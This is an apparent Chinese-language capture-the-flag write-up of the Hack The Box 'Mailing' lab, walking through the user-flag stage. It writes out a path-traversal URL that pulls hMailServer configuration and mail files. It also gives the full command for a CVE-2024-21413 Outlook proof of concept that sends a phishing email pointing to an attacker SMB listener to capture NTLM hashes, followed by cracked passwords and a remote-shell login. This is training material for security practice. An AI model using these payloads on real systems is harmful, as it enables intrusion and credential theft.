---
title: HTB - Mailing
published: 2024-05-14
tags: [HTB]
category: Write Up
draft: false
password: aad3b435b51404eeaad3b435b51404eeaad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
abstract: 你看不到我...你看不到我...
message: 輸入密碼
---

# HTB - Mailing

![圖片](https://hackmd.io/_uploads/S1b4afhfA.png)

Target IP : ```10.129.231.35```
Target OS : ```Windows```

---
## user.txt

### nmap enumerate
```nmap

PORT      STATE SERVICE       REASON  VERSION
25/tcp    open  smtp          syn-ack hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://mailing.htb
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
110/tcp   open  pop3          syn-ack hMailServer pop3d
|_pop3-capabilities: TOP UIDL USER
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
143/tcp   open  imap          syn-ack hMailServer imapd
|_imap-capabilities: IMAP4 SORT IDLE completed CHILDREN CAPABILITY IMAP4rev1 ACL OK QUOTA RIGHTS=texkA0001 NAMESPACE
445/tcp   open  microsoft-ds? syn-ack
465/tcp   open  ssl/smtp      syn-ack hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
587/tcp   open  smtp          syn-ack hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
993/tcp   open  ssl/imap      syn-ack hMailServer imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IMAP4 SORT IDLE completed CHILDREN CAPABILITY IMAP4rev1 ACL OK QUOTA RIGHTS=texkA0001 NAMESPACE
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
5040/tcp  open  unknown       syn-ack
7680/tcp  open  pando-pub?    syn-ack
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
57635/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 34873/tcp): CLEAN (Timeout)
|   Check 2 (port 45168/tcp): CLEAN (Timeout)
|   Check 3 (port 25500/udp): CLEAN (Timeout)
|   Check 4 (port 41457/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-10T22:19:36
|_  start_date: N/A
|_clock-skew: 2s
```
老樣子，先做域名對應

![圖片](https://hackmd.io/_uploads/rJVtRz2fA.png)



---

### LFI ( Local File Inclusion )

進到網站頁面，似乎沒啥功能只是介紹這個軟體

![圖片](https://hackmd.io/_uploads/B1V9JmnGC.png)

看到一個有趣的東西

![圖片](https://hackmd.io/_uploads/rJk2173zR.png)

看到 php 又看到直接引用檔案 , 很容易就聯想到 LFI

![圖片](https://hackmd.io/_uploads/BJKllmnf0.png)

確認一次 , 確實有這個漏洞

![圖片](https://hackmd.io/_uploads/BJtSxX2zA.png)

由於不知道檔案路徑可以用的地方在哪裡 , 所以先安裝 hMail

![圖片](https://hackmd.io/_uploads/r1ikzXnGR.png)

找到一個資料夾底下的 .INI 似乎是伺服器的設定檔

![圖片](https://hackmd.io/_uploads/SJVszX3GA.png)

於是乎用剛剛的漏洞嘗試能不能從伺服器扒下來

![圖片](https://hackmd.io/_uploads/Sk6lXQnfR.png)

![圖片](https://hackmd.io/_uploads/BkAfXQhGC.png)

分析一下是administrator的密碼是哪種Hash

![圖片](https://hackmd.io/_uploads/HyhwXQnGR.png)

用 hashcat 跑出來的結果為

```841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator```

密碼感覺跟資料庫有關係 , 依照安裝在local的伺服器得知資料庫的位置 , 所以

```http://mailing.htb/download.php?file=..\..\..\..\..\Program%20Files%20(x86)\hMailServer\Database\hMailServer.sdf```

好像是特定格式的資料庫 , 經一番搜索後找到一個 windows 的程式可以開啟

![圖片](https://hackmd.io/_uploads/S19PL72GC.png)

好吧... 輸入剛剛的密碼也不管用 , 去查一下他要怎麼解密

![圖片](https://hackmd.io/_uploads/SybTUXhMR.png)

找到一則很有用的文章 , 大致上來說就是
1. 找解密用vbs
2. 輸入密碼
3. 輸入 [Database] 底下的 hash
4. 得到解密用密碼

![圖片](https://hackmd.io/_uploads/ryRDwm2MA.png)

經上述步驟 , 得到

![圖片](https://hackmd.io/_uploads/r1A6wm3MC.png)

解密後

![圖片](https://hackmd.io/_uploads/rk_Xd73zA.png)

![圖片](https://hackmd.io/_uploads/HJf1t72zC.png)
似乎這的資料庫沒有直接紀錄信件訊息
而是只有儲存信件的名稱 , 於是乎準備去 google 相關路徑

![圖片](https://hackmd.io/_uploads/BkR337hfA.png)

```C:\Program Files\hMailserver\Data\domain.dom\user\E6\{E6..restoffilename}.EML```

不過 , 資料庫裡面的都是發信者的帳號 , 只有四個用戶組所以我想可以慢慢猜

經過一番嘗試後隨便找一封信下載下來
```http://mailing.htb/download.php?file=..\..\..\..\..\Program%20Files%20(x86)\hMailServer\Data\mailing.htb\maya\6E\{6E5EE719-D1E3-4DDD-A019-3787CC5C137F}.eml```

### CVE-2024-21413
結果是一封超像釣魚的信,而且還是管理員寄過來的

![圖片](https://hackmd.io/_uploads/HyhmCm2MC.png)

底部有一個

![圖片](https://hackmd.io/_uploads/ByCF1E3fC.png)

依照提示找到一個專案工具
[github](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

大意是說 , 有個漏洞你只要閱覽郵件就會自動讀取裡面的 url
用來劫持 NTLM 之類的

先來開個 responder
```
sudo responder -I tun0 -w -d

```
執行poc腳本
```
python CVE-2024-21413.py --server 10.129.231.35 --port 587 --username "administrator@mailing.htb" --password "homenetworkingadministrator" --sender "administrator@mailing.htb" --recipient "maya@mailing.htb" --url '\\10.10.16.26\smb\hello' --subject "You are fire"
```

~~然後甚麼事情都沒發生~~
其實是這個 poc 還是要使用者點開郵件才能觸發的
所以我們要等使用者點開這個郵件

![圖片](https://hackmd.io/_uploads/rJvE_P2GC.png)
>等了至少一小時 , 期間去玩其他CTF

之後拿去跑 hashcat

![圖片](https://hackmd.io/_uploads/S1Q1Fv2zR.png)

密碼是 ```m4y4ngs4ri```

接者直接連上去

```evil-winrm -i 10.129.43.97 -u 'maya' -p 'm4y4ngs4ri'```

![圖片](https://hackmd.io/_uploads/BJ3zcv3MC.png)



---



















